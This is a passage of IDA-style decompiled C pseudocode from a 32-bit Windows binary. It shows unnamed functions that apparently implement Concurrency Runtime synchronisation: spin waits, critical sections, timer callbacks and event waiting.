      result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 4) + 12))(*(_DWORD *)(v1 + 4));
      v1 = v3;
    }
    while ( v3 );
  }
  return result;
}

//----- (00449364) --------------------------------------------------------
_DWORD *__thiscall sub_449364(void *Block, _DWORD *a2, int a3)
{
  int v4; // ebx
  _DWORD *result; // eax
  bool v6; // zf
  int v7; // eax
  void *v8; // eax
  HANDLE Timer; // [esp+Ch] [ebp-4h]

  v4 = *((_DWORD *)Block + 1);
  if ( !*((_BYTE *)Block + 40)
    || (result = (_DWORD *)_InterlockedIncrement((volatile signed __int32 *)Block + 5), result == (_DWORD *)1) )
  {
    v6 = *((_DWORD *)Block + 4) == 0;
    *((_DWORD *)Block + 3) = a3;
    if ( !v6 )
    {
      v7 = sub_44CE8E();
      Timer = (HANDLE)*((_DWORD *)Block + 4);
      if ( v7 < 3 )
      {
        v8 = (void *)sub_4490DF();
        sub_44A727(v8, Timer, (HANDLE)0xFFFFFFFF);
      }
      else
      {
        sub_44AB83(*((_DWORD *)Block + 4));
      }
      if ( *((_DWORD *)Block + 5) == 1 )
        sub_449173(Block);
    }
    if ( *(_DWORD *)(*(_DWORD *)(a3 + 4) + 8) == 2
      || _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)(a3 + 4) + 8), 1, 0) == 2 )
    {
      result = a2;
      if ( a2 )
        *a2 = v4;
      else
        return (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
    }
    else
    {
      result = a2;
      if ( a2 )
        *a2 = 0;
    }
  }
  return result;
}
// 44CE8E: using guessed type int sub_44CE8E(void);

//----- (00449419) --------------------------------------------------------
_DWORD *__cdecl sub_449419(_DWORD **a1, char a2)
{
  _DWORD **v2; // esi
  _DWORD *v3; // edi
  _DWORD *v4; // ebx
  char v5; // al

  v2 = a1;
  v3 = 0;
  if ( a1 )
  {
    do
    {
      v4 = *v2;
      if ( a2 )
        v5 = sub_44949F(v2);
      else
        v5 = sub_449453(v2);
      if ( v5 )
      {
        *v2 = v3;
        v3 = v2;
      }
      v2 = (_DWORD **)v4;
    }
    while ( v4 );
  }
  return v3;
}

//----- (00449453) --------------------------------------------------------
int __thiscall sub_449453(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 16))(this[1]);
}

//----- (0044946C) --------------------------------------------------------
char __thiscall sub_44946C(_DWORD *this)
{
  if ( this[8] >= this[7] )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    return 0;
  }
  if ( *((_BYTE *)this + 41) )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 8))(this);
    return 0;
  }
  return 1;
}

//----- (0044949F) --------------------------------------------------------
int __thiscall sub_44949F(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 12))(this[1]);
}

//----- (004494B8) --------------------------------------------------------
char __thiscall sub_4494B8(_BYTE *this)
{
  if ( !this[36] )
    return 1;
  (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 8))(this);
  return 0;
}

//----- (004494DC) --------------------------------------------------------
char __thiscall sub_4494DC(_BYTE *this)
{
  char v3[4]; // [esp+4h] [ebp-4h] BYREF

  if ( !this[41] )
    return 1;
  if ( (**(unsigned __int8 (__thiscall ***)(_BYTE *, char *, _DWORD))this)(this, v3, 0) )
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 8))(this);
  return 0;
}
// 4494DC: using guessed type char var_4[4];

//----- (0044951F) --------------------------------------------------------
char __thiscall sub_44951F(_DWORD *this)
{
  char v2[4]; // [esp+4h] [ebp-4h] BYREF

  if ( this[8] < this[7] && !*((_BYTE *)this + 41) )
    return 1;
  (*(void (__thiscall **)(_DWORD *, char *, _DWORD))*this)(this, v2, 0);
  return 0;
}
// 44951F: using guessed type char var_4[4];

//----- (00449555) --------------------------------------------------------
int __thiscall sub_449555(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    *this = a2;
    result = 1;
    this[1] = 1;
  }
  else
  {
    result = 4;
  }
  this[2] = result;
  return result;
}

//----- (00449573) --------------------------------------------------------
int __thiscall sub_449573(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    this[1] = 0;
    *this = a2;
    result = 1;
  }
  else
  {
    result = 4;
  }
  this[2] = result;
  return result;
}

//----- (00449592) --------------------------------------------------------
char __thiscall sub_449592(int this)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  bool v9; // zf

  while ( 1 )
  {
    v2 = *(_DWORD *)(this + 8);
    if ( v2 )
      break;
    *(_DWORD *)(this + 8) = 0;
    v3 = sub_44A3AB();
    sub_449555((_DWORD *)this, v3);
  }
  v4 = v2 - 1;
  if ( !v4 )
  {
    _mm_pause();
    v9 = (*(_DWORD *)this)-- == 1;
    if ( v9 )
      *(_DWORD *)(this + 8) = 3 - (*(_DWORD *)(this + 4) != 0);
    return 1;
  }
  v5 = v4 - 1;
  if ( !v5 )
  {
    v9 = (*(_DWORD *)(this + 4))-- == 1;
    if ( v9 )
      *(_DWORD *)(this + 8) = 3;
    (*(void (__thiscall **)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
    return 1;
  }
  v6 = v5 - 1;
  if ( v6 )
  {
    if ( v6 == 1 )
      (*(void (__thiscall **)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
  }
  else
  {
    *(_DWORD *)(this + 8) = 0;
    v7 = sub_44A3AB();
    sub_449555((_DWORD *)this, v7);
  }
  return 0;
}

//----- (0044961B) --------------------------------------------------------
char __thiscall sub_44961B(_DWORD *this)
{
  char v2; // bl
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  bool v10; // zf

  v2 = 0;
  while ( 1 )
  {
    v3 = this[2];
    if ( v3 )
      break;
    this[2] = 0;
    v4 = sub_44A3AB();
    sub_449573(this, v4);
  }
  v5 = v3 - 1;
  if ( v5 )
  {
    v6 = v5 - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( !v7 )
      {
        this[2] = 0;
        v8 = sub_44A3AB();
        sub_449573(this, v8);
        return 0;
      }
      if ( v7 != 1 )
        return 0;
    }
    else
    {
      v10 = this[1]-- == 1;
      if ( v10 )
        this[2] = 3;
      v2 = 1;
    }
    _mm_pause();
    return v2;
  }
  else
  {
    _mm_pause();
    v10 = (*this)-- == 1;
    if ( v10 )
      this[2] = 3 - (this[1] != 0);
    return 1;
  }
}

//----- (00449692) --------------------------------------------------------
bool __thiscall sub_449692(char *Parameter, DWORD DueTime)
{
  int *v3; // edi
  int v4; // eax
  void *v6; // eax

  if ( !Parameter[24] )
    return 0;
  v3 = (int *)(Parameter + 20);
  if ( sub_44CE8E() < 3 )
  {
    v6 = (void *)sub_4490DF();
    return sub_44A707((PHANDLE)Parameter + 5, v6, sub_4490BD, Parameter, DueTime, 0, 0x20u);
  }
  else
  {
    v4 = sub_44AD0F(DueTime, (int)sub_449031, (int)Parameter, 0);
    *v3 = v4;
    return v4 != 0;
  }
}
// 44CE8E: using guessed type int sub_44CE8E(void);

//----- (004496F5) --------------------------------------------------------
void __thiscall sub_4496F5(int this, unsigned __int8 a2)
{
  void *v3; // esi
  void *v4; // eax

  if ( *(_BYTE *)(this + 24) )
  {
    if ( sub_44CE8E() < 3 )
    {
      v3 = *(void **)(this + 20);
      v4 = (void *)sub_4490DF();
      sub_44A727(v4, v3, (HANDLE)((a2 ^ 1) - 1));
    }
    else if ( a2 )
    {
      if ( *(_DWORD *)(this + 20) )
        sub_44AB83(*(_DWORD *)(this + 20));
    }
  }
}
// 44CE8E: using guessed type int sub_44CE8E(void);

//----- (00449742) --------------------------------------------------------
void __thiscall sub_449742(_DWORD *this)
{
  _DWORD **v2; // edi
  _DWORD **v3; // ebx
  void *v4[7]; // [esp+4h] [ebp-20h] BYREF
  int v5; // [esp+20h] [ebp-4h] BYREF

  if ( *this )
  {
    sub_449F38((int)v4, (int)(this + 1));
    v2 = (_DWORD **)*this;
    *this = 0;
    sub_449F6A(v4);
    if ( v2 )
    {
      do
      {
        v5 = 0;
        sub_4491C1((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, (int)&v5);
        v3 = (_DWORD **)*v2;
        sub_448F9B(v2);
        if ( v5 )
          (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 12))(v5);
        v2 = v3;
      }
      while ( v3 );
    }
  }
}

//----- (004497AD) --------------------------------------------------------
void __thiscall sub_4497AD(_DWORD *this)
{
  _DWORD **v2; // edi
  _DWORD *v3; // esi
  void *v4[7]; // [esp+10h] [ebp-2Ch] BYREF
  int v5[4]; // [esp+2Ch] [ebp-10h] BYREF

  if ( *this )
  {
    sub_449F38((int)v4, (int)(this + 1));
    v2 = (_DWORD **)*this;
    v5[3] = 0;
    v5[0] = 0;
    if ( v2 )
    {
      while ( !(unsigned __int8)sub_4491C1((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, (int)v5) )
      {
        v3 = *v2;
        sub_448F9B(v2);
        v2 = (_DWORD **)v3;
        if ( !v3 )
          goto LABEL_5;
      }
      *this = *v2;
      sub_448F9B(v2);
      (*(void (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    }
    else
    {
LABEL_5:
      *this = 0;
    }
    sub_449F6A(v4);
  }
}

//----- (0044982B) --------------------------------------------------------
void __thiscall sub_44982B(volatile __int32 *this)
{
  int v1; // ebx
  int v2; // esi
  _DWORD *v3; // edi
  int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // eax
  void *v7; // esp
  _DWORD *v8; // ebx
  _DWORD *v9; // eax
  volatile __int32 *v10; // ecx
  _DWORD v11[4]; // [esp+0h] [ebp-60h] BYREF
  void *v12; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[4]; // [esp+2Ch] [ebp-34h] BYREF
  int v14; // [esp+3Ch] [ebp-24h]
  int v15; // [esp+40h] [ebp-20h]
  int v16; // [esp+44h] [ebp-1Ch] BYREF
  volatile __int32 *v17; // [esp+48h] [ebp-18h]
  _DWORD *v18; // [esp+4Ch] [ebp-14h]
  int v19; // [esp+5Ch] [ebp-4h]

  v17 = this;
  pExceptionObject[3] = &Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';
  v1 = 0;
  v14 = 0;
  v2 = 0;
  v15 = 0;
  v19 = 1;
  sub_449F38(this + 2);
  v3 = (_DWORD *)_InterlockedExchange(v17, 1);
  if ( (unsigned int)v3 <= 1 )
    goto LABEL_17;
  v4 = 0;
  v5 = v3;
  do
  {
    v5 = (_DWORD *)*v5;
    ++v4;
  }
  while ( v5 );
  v6 = 4 * v4 < (unsigned int)(4 * v4 + 8) ? 4 * v4 + 8 : 0;
  if ( !v6 )
    goto LABEL_24;
  if ( v6 > 0x400 )
  {
    v9 = malloc(v6);
    v8 = v9;
    if ( !v9 )
      goto LABEL_24;
    *v9 = 56797;
  }
  else
  {
    v7 = alloca(v6);
    v8 = v11;
    if ( !v11 )
      goto LABEL_24;
    v11[0] = 52428;
  }
  v1 = (int)(v8 + 2);
  if ( !v1 )
  {
LABEL_24:
    sub_42E414(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  v15 = 0;
  v2 = 0;
  v14 = v1;
  do
  {
    v18 = (_DWORD *)*v3;
    if ( (unsigned __int8)sub_4491C1((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v3, (int)&v16) )
    {
      v10 = v17;
      *v3 = *((_DWORD *)v17 + 1);
      *((_DWORD *)v10 + 1) = v3;
    }
    if ( v16 )
      *(_DWORD *)(v1 + 4 * v2++) = v16;
    v3 = v18;
  }
  while ( v18 );
LABEL_17:
  LOBYTE(v19) = 0;
  sub_449F6A(&v12);
  while ( v2 )
  {
    v18 = (_DWORD *)(v2 - 1);
    (*(void (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(v1 + 4 * (v2 - 1)) + 12))(
      *(_DWORD *)(v1 + 4 * (v2 - 1)),
      v11[0]);
    v2 = (int)v18;
  }
  if ( v14 )
  {
    if ( *(_DWORD *)(v14 - 8) == 56797 )
      free((void *)(v14 - 8));
  }
}
// 449F38: using guessed type _DWORD __stdcall sub_449F38(_DWORD);
// 493900: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';

//----- (00449974) --------------------------------------------------------
signed __int32 __thiscall sub_449974(_DWORD ***this, void *a2)
{
  char v4[12]; // [esp+10h] [ebp-50h] BYREF
  _DWORD *v5; // [esp+1Ch] [ebp-44h] BYREF
  void *v6[9]; // [esp+38h] [ebp-28h] BYREF
  int v7; // [esp+5Ch] [ebp-4h]

  sub_448DB8((int)v4, 0);
  sub_449F38((int)v6, (int)(this + 1));
  v7 = 0;
  v5 = sub_449419(*this, 1);
  *this = &v5;
  sub_44A4C5(a2);
  v7 = -1;
  sub_449F6A(v6);
  sub_44AEC3();
  return sub_44A3EE(a2);
}
// 449974: using guessed type char var_50[12];

//----- (004499D8) --------------------------------------------------------
unsigned int __thiscall sub_4499D8(_DWORD ***this, DWORD DueTime)
{
  void *v4; // [esp+10h] [ebp-50h] BYREF
  _DWORD v5[4]; // [esp+2Ch] [ebp-34h] BYREF
  int v6[2]; // [esp+3Ch] [ebp-24h] BYREF
  signed __int32 v7; // [esp+44h] [ebp-1Ch] BYREF
  int v8[2]; // [esp+48h] [ebp-18h] BYREF
  int v9[3]; // [esp+50h] [ebp-10h] BYREF
  int v10; // [esp+5Ch] [ebp-4h]

  if ( DueTime == -1 )
  {
    v5[3] = sub_44AE9C;
    v9[0] = 0;
    v5[2] = 0;
    while ( *this != (_DWORD **)1 )
    {
      if ( !sub_44961B(v5) )
      {
        sub_448E0F(v6);
        v6[0] = (int)&Concurrency::details::SingleWaitBlock::`vftable';
        v8[1] = (int)v6;
        sub_449F38(this + 2);
        v10 = 0;
        if ( *this == (_DWORD **)1 )
        {
          LOBYTE(v9[0]) = 1;
        }
        else
        {
          v8[0] = (int)sub_449419(*this, 1);
          *this = (_DWORD **)v8;
        }
        v10 = -1;
        sub_449F6A(&v4);
        if ( !LOBYTE(v9[0]) && v7 != 1 && _InterlockedCompareExchange(&v7, 2, 0) != 1 )
          sub_44AEC3();
        return 0;
      }
    }
  }
  else
  {
    if ( DueTime )
    {
      v9[0] = (int)this;
      return sub_449BA1(v9, 1u, 1, DueTime);
    }
    if ( *this != (_DWORD **)1 )
      return -1;
  }
  return 0;
}
// 449F38: using guessed type _DWORD __stdcall sub_449F38(_DWORD);
// 49387C: using guessed type void *Concurrency::details::SingleWaitBlock::`vftable';
// 4499D8: using guessed type int var_10[3];

//----- (00449AB9) --------------------------------------------------------
char __thiscall sub_449AB9(_DWORD ***this, void *a2, DWORD DueTime)
{
  void *v4; // eax
  int v5; // edi
  bool v6; // bl
  void *v7[7]; // [esp+10h] [ebp-3Ch] BYREF
  void *pExceptionObject[4]; // [esp+2Ch] [ebp-20h] BYREF
  _DWORD ***v9; // [esp+3Ch] [ebp-10h]
  int v10; // [esp+48h] [ebp-4h]

  v9 = this;
  if ( !DueTime )
    return 0;
  if ( DueTime == -1 )
  {
    sub_449974(this, a2);
    return 1;
  }
  else
  {
    v4 = operator new(0x28u);
    pExceptionObject[3] = v4;
    v5 = 0;
    v10 = 0;
    if ( v4 )
      v5 = sub_448DB8((int)v4, 1);
    v10 = -1;
    sub_449F38((int)v7, (int)(v9 + 1));
    v10 = 1;
    *(_DWORD *)(v5 + 12) = sub_449419(*v9, 1);
    *v9 = (_DWORD **)(v5 + 12);
    if ( !sub_449692((char *)v5, DueTime) )
    {
      sub_42E414(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    sub_44A4C5(a2);
    v10 = -1;
    sub_449F6A(v7);
    sub_44AEC3();
    v6 = *(_BYTE *)(v5 + 36) == 0;
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 8))(v5);
    sub_44A3EE(a2);
    return v6;
  }
}

//----- (00449BA1) --------------------------------------------------------
unsigned int __cdecl sub_449BA1(_DWORD *a1, unsigned int a2, char a3, DWORD DueTime)
{
  DWORD v5; // edi
  unsigned int v6; // ebx
  unsigned int i; // eax
  bool v8; // al
  unsigned int v9; // edx
  _DWORD *v10; // eax
  char *v11; // ecx
  _DWORD *v12; // eax
  char *v13; // ecx
  unsigned int v14; // eax
  int v15; // edi
  char *v16; // ebx
  unsigned int v17; // esi
  HANDLE *v18; // esi
  int v19; // eax
  int v20; // eax
  void *v21; // eax
  HANDLE v22; // eax
  PVOID v23; // [esp-10h] [ebp-90h]
  void *v24[7]; // [esp+10h] [ebp-70h] BYREF
  int v25; // [esp+2Ch] [ebp-54h] BYREF
  unsigned int v26; // [esp+30h] [ebp-50h]
  int v27; // [esp+38h] [ebp-48h]
  PVOID Parameter; // [esp+3Ch] [ebp-44h]
  int v29; // [esp+40h] [ebp-40h]
  _DWORD pExceptionObject[3]; // [esp+48h] [ebp-38h] BYREF
  _DWORD v31[3]; // [esp+54h] [ebp-2Ch] BYREF
  unsigned int v32; // [esp+60h] [ebp-20h]
  int v33; // [esp+64h] [ebp-1Ch] BYREF
  _DWORD ***v34; // [esp+68h] [ebp-18h]
  char *v35; // [esp+6Ch] [ebp-14h]
  char v36; // [esp+73h] [ebp-Dh]
  int v37; // [esp+7Ch] [ebp-4h]

  if ( !a1 )
    goto LABEL_54;
  if ( !a2 )
    return 0;
  v5 = DueTime;
  v6 = -1;
  if ( a2 == 1 && (!DueTime || DueTime == -1) )
  {
    if ( *a1 )
      return sub_4499D8(DueTime);
LABEL_54:
    sub_42E473((char *)v31, (int)"pEvents");
    _CxxThrowException(v31, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  for ( i = 0; i < a2; ++i )
  {
    if ( !a1[i] )
      goto LABEL_54;
  }
  v8 = DueTime && DueTime != -1;
  sub_448D31(&v25, a3, a2, DueTime != -1, v8);
  v37 = 0;
  v9 = 0;
  v36 = 0;
  v32 = 0;
  v35 = (char *)(v25 + v27);
  while ( 1 )
  {
    v34 = (_DWORD ***)a1[v9];
    sub_449F38(v34 + 2);
    ++v29;
    LOBYTE(v37) = 1;
    if ( *v34 == (_DWORD **)1 )
      break;
    v12 = sub_449419(*v34, 1);
    v13 = v35;
    *(_DWORD *)v35 = v12;
    *v34 = (_DWORD **)v13;
LABEL_25:
    LOBYTE(v37) = 0;
    sub_449F6A(v24);
    v9 = v32 + 1;
    v32 = v9;
    v35 += v26;
    if ( v9 >= a2 )
      goto LABEL_34;
  }
  if ( a3 )
  {
    if ( (unsigned __int8)sub_4491C1((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v35, (int)&v33) )
    {
      v10 = sub_449419(v34[1], 0);
      v11 = v35;
      *(_DWORD *)v35 = v10;
      v34[1] = (_DWORD **)v11;
    }
    if ( v33 )
      v36 = 1;
    goto LABEL_25;
  }
  sub_4491C1((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v35, (int)&v33);
  if ( v33 )
    v36 = 1;
  v14 = v32 + 1;
  if ( v32 + 1 < a2 )
  {
    v15 = v29;
    v16 = (char *)(v25 + v27 + v14 * v26);
    v17 = a2 - v14;
    do
    {
      v29 = ++v15;
      sub_4491C1((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v16, (int)&v33);
      v16 += v26;
      --v17;
    }
    while ( v17 );
    v5 = DueTime;
    v6 = -1;
  }
  LOBYTE(v37) = 0;
  sub_449F6A(v24);
LABEL_34:
  if ( v36
    || *((_DWORD *)Parameter + 2) == 1
    || _InterlockedCompareExchange((volatile signed __int32 *)Parameter + 2, 2, 0) == 1 )
  {
    v18 = (HANDLE *)Parameter;
  }
  else
  {
    if ( v5 )
    {
      if ( v5 == -1 || *((_DWORD *)Parameter + 5) )
      {
        v18 = (HANDLE *)Parameter;
      }
      else
      {
        v19 = sub_44CE8E();
        v18 = (HANDLE *)Parameter;
        if ( v19 < 3 )
        {
          v23 = Parameter;
          v21 = (void *)sub_4490DF();
          if ( !sub_44A707(v18 + 4, v21, (WAITORTIMERCALLBACK)sub_449064, v23, v5, 0, 0x20u) )
          {
            sub_42E414(pExceptionObject);
            _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
          }
        }
        else
        {
          v20 = sub_44AD0F(v5, (int)sub_448FD3, (int)Parameter, 0);
          v18[4] = (HANDLE)v20;
          if ( !v20 )
          {
            sub_42E414(v31);
            _CxxThrowException(v31, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
          }
        }
        ++v29;
      }
    }
    else
    {
      v18 = (HANDLE *)Parameter;
      if ( _InterlockedIncrement((volatile signed __int32 *)Parameter + 5) == 1 )
      {
        v18[3] = 0;
        *((_BYTE *)v18 + 41) = 1;
        goto LABEL_51;
      }
    }
    sub_44AEC3();
  }
LABEL_51:
  v22 = v18[3];
  if ( v22 )
    v6 = ((unsigned int)v22 - v27 - v25) / v26;
  sub_448E8D(&v25);
  return v6;
}
// 449BF2: conditional instruction was optimized away because %arg_4.4!=0
// 449C37: conditional instruction was optimized away because %arg_4.4!=0
// 4499D8: using guessed type _DWORD __stdcall sub_4499D8(DWORD DueTime);
// 449F38: using guessed type _DWORD __stdcall sub_449F38(_DWORD);
// 44CE8E: using guessed type int sub_44CE8E(void);
// 449BA1: using guessed type _DWORD pExceptionObject[3];

//----- (00449E48) --------------------------------------------------------
HANDLE *__thiscall sub_449E48(HANDLE *Parameter, DWORD DueTime)
{
  HANDLE *v3; // edi
  void *v4; // eax
  void *v5; // eax
  _DWORD pExceptionObject[3]; // [esp+Ch] [ebp-Ch] BYREF

  Parameter[1] = 0;
  v3 = Parameter + 3;
  Parameter[2] = HANDLE_FLAG_INHERIT;
  Parameter[3] = 0;
  Parameter[4] = 0;
  Parameter[5] = 0;
  *Parameter = sub_44A028();
  if ( DueTime != -1 )
  {
    if ( sub_44CE8E() < 3 )
    {
      v5 = (void *)sub_4490DF();
      v4 = (void *)sub_44A707(v3, v5, (WAITORTIMERCALLBACK)sub_44A0B0, Parameter, DueTime, 0, 0x20u);
    }
    else
    {
      v4 = (void *)sub_44AD0F(DueTime, (int)sub_44A069, (int)Parameter, 0);
      *v3 = v4;
    }
    if ( !v4 )
    {
      sub_42E414(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  return Parameter;
}
// 44CE8E: using guessed type int sub_44CE8E(void);
// 449E48: using guessed type _DWORD pExceptionObject[3];

//----- (00449ED8) --------------------------------------------------------
LPCRITICAL_SECTION __thiscall sub_449ED8(LPCRITICAL_SECTION lpCriticalSection)
{
  sub_44A962(lpCriticalSection, dwSpinCount);
  return lpCriticalSection;
}

//----- (00449EED) --------------------------------------------------------
_DWORD *__thiscall sub_449EED(_DWORD *this)
{
  _DWORD *result; // eax

  *this = 0;
  result = this;
  this[1] = 0;
  return result;
}

//----- (00449EFD) --------------------------------------------------------
_DWORD *__thiscall sub_449EFD(_DWORD *this)
{
  this[6] = 0;
  this[7] = 0;
  *this = 0;
  this[1] = 0;
  this[3] = 0;
  this[2] = 2;
  this[4] = 0;
  this[5] = 0;
  return this;
}

//----- (00449F1D) --------------------------------------------------------
char *__thiscall sub_449F1D(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::improper_lock::`vftable';
  return this;
}
// 493910: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (00449F38) --------------------------------------------------------
int __thiscall sub_449F38(int this, int a2)
{
  volatile signed __int32 *v3; // esi

  v3 = (volatile signed __int32 *)(this + 4);
  *(_DWORD *)this = a2;
  sub_449E48((HANDLE *)(this + 4), 0xFFFFFFFF);
  sub_44A24E(*(_DWORD *)this, v3, 1);
  return this;
}

//----- (00449F62) --------------------------------------------------------
void __thiscall sub_449F62(LPCRITICAL_SECTION lpCriticalSection)
{
  DeleteCriticalSection(lpCriticalSection);
}

//----- (00449F6A) --------------------------------------------------------
void __thiscall sub_449F6A(void **this)
{
  sub_44A4C5(*this);
}

//----- (00449FA2) --------------------------------------------------------
int __thiscall sub_449FA2(_DWORD *this, unsigned int a2)
{
  int v3; // edi
  unsigned int v4; // edx
  unsigned int v5; // edi
  _DWORD v7[4]; // [esp+8h] [ebp-10h] BYREF

  v3 = sub_44CE93();
  if ( (this[2] & 4) == 0 )
  {
    v4 = (this[2] & 2) != 0 ? (this[2] >> 3) - (a2 >> 3) : 1;
    v5 = v3 + 2;
    if ( v4 <= v5 )
    {
      v7[2] = 0;
      v7[3] = sub_44AE9C;
      sub_449573(v7, dwSpinCount + dwSpinCount * (v4 - 1) / v5);
      while ( (this[2] & 1) != 0 && sub_44961B(v7) )
        ;
    }
  }
  return sub_44AEC3();
}

//----- (0044A028) --------------------------------------------------------
_DWORD *sub_44A028()
{
  _DWORD *result; // eax

  if ( dword_4F807C >= 0 )
    return sub_450017();
  result = sub_44AAC3(dword_500038);
  if ( !result )
    return sub_450017();
  return result;
}
// 4F807C: using guessed type int dword_4F807C;

//----- (0044A04A) --------------------------------------------------------
void __thiscall sub_44A04A(volatile signed __int32 *Block)
{
  if ( *((_DWORD *)Block + 3) )
  {
    if ( _InterlockedIncrement(Block + 5) == 2 )
      sub_44775B((void *)Block);
  }
}

//----- (0044A069) --------------------------------------------------------
HMODULE __stdcall sub_44A069(int a1, volatile signed __int32 *Block, int a3)
{
  if ( _InterlockedCompareExchange(Block + 4, 2, 0) )
    sub_44A04A(Block);
  else
    (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)Block + 12))(*Block);
  return sub_44ADA7(a1, a3);
}

//----- (0044A0B0) --------------------------------------------------------
void __stdcall sub_44A0B0(volatile signed __int32 *Block, int a2)
{
  void *v2; // esi
  void *v3; // eax

  v2 = (void *)*((_DWORD *)Block + 3);
  v3 = (void *)sub_4490DF();
  sub_44A727(v3, v2, 0);
  if ( _InterlockedCompareExchange(Block + 4, 2, 0) )
    sub_44A04A(Block);
  else
    (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)Block + 12))(*Block);
}

//----- (0044A0FE) --------------------------------------------------------
void __thiscall sub_44A0FE(volatile signed __int32 *Block)
{
  if ( *((_DWORD *)Block + 3) )
  {
    if ( _InterlockedExchange(Block + 4, 1) == 2 )
    {
      sub_44AEC3();
      sub_44A04A(Block);
    }
  }
}

//----- (0044A123) --------------------------------------------------------
char __thiscall sub_44A123(volatile signed __int32 *this)
{
  if ( _InterlockedCompareExchange(this + 4, 1, 0) )
    return 0;
  *((_DWORD *)this + 2) &= ~1u;
  (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)this + 12))(*this);
  return 1;
}

//----- (0044A155) --------------------------------------------------------
_DWORD *__thiscall sub_44A155(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  unsigned int v3; // ebx

  result = (_DWORD *)(this[2] >> 1);
  if ( (this[2] & 2) == 0 )
  {
    result = (_DWORD *)(a2[2] >> 1);
    if ( (a2[2] & 2) != 0 )
    {
      v3 = (a2[2] + 8) & 0xFFFFFFFA;
      if ( (a2[2] & 1) != 0
        && ((a2[2] & 4) != 0 || !a2[3] && (*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 16))(*a2)) )
      {
        v3 |= 4u;
      }
      result = this;
      this[2] |= v3;
    }
  }
  return result;
}

//----- (0044A1BD) --------------------------------------------------------
int __thiscall sub_44A1BD(_DWORD *this)
{
  int result; // eax
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  int (*v5)(); // [esp+10h] [ebp-4h]

  result = this[1];
  v4 = 0;
  v5 = sub_44AE9C;
  while ( !result )
  {
    sub_449592((int)v3);
    result = this[1];
  }
  return result;
}
// 44A1BD: using guessed type char var_10[8];

//----- (0044A1E8) --------------------------------------------------------
void __thiscall sub_44A1E8(LPCRITICAL_SECTION lpCriticalSection)
{
  EnterCriticalSection(lpCriticalSection);
}

//----- (0044A1F0) --------------------------------------------------------
signed __int32 __thiscall sub_44A1F0(volatile signed __int32 *this)
{
  int *v2; // edi
  signed __int32 v3; // edx
  signed __int32 result; // eax

  v2 = (int *)(this + 1);
  while ( 1 )
  {
    if ( *v2 > 0 )
      sub_44A3B1(v2, 0, -1);
    v3 = *this;
    if ( *this != -1 )
    {
      result = _InterlockedCompareExchange(this, v3 + 1, v3);
      if ( result == v3 )
        break;
    }
  }
  return result;
}

//----- (0044A220) --------------------------------------------------------
signed __int32 __thiscall sub_44A220(volatile signed __int32 *this)
{
  signed __int32 result; // eax

  _InterlockedIncrement(this + 1);
  for ( result = _InterlockedCompareExchange(this, -1, 0); result; result = _InterlockedCompareExchange(this, -1, 0) )
    sub_44A3B1(this, 0, -1);
  return result;
}

//----- (0044A24E) --------------------------------------------------------
bool __thiscall sub_44A24E(int this, volatile signed __int32 *Block, char a3)
{
  _DWORD *v4; // ebx
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( *Block == *(_DWORD *)this )
  {
    sub_452958(pExceptionObject, (int)"Lock already taken");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_lock_Concurrency__);
  }
  v4 = (_DWORD *)_InterlockedExchange((volatile __int32 *)(this + 28), (__int32)Block);
  if ( v4 )
  {
    sub_44A155(Block, v4);
    v4[1] = Block;
    sub_449FA2(Block, *(_DWORD *)(this + 8));
    if ( *((_DWORD *)Block + 4) != 2 )
      sub_44A155(Block, (_DWORD *)this);
  }
  else
  {
